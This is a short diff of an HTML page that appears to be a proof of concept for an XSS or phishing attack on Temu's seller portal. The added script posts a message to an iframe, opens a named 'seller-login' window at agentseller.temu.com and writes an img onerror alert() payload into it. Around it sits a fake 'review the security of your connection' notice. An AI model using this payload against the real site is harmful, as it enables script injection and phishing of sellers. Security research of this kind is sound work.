@@ -568,9 +568,11 @@
         setTimeout(() => {
           iframe.contentWindow.postMessage(
            ` 
+           <script>
           hamid = window.open('', 'seller-login');
           hamid.window.location = 'https://agentseller.temu.com/';
           hamid.document.write("<img src=x onerror=alert()'))>")
+          </script>
         `,'*')}, 9000)
       </script>
       <div id="message" class="core-msg spacer spacer-top">temu.com needs to review the security of your connection
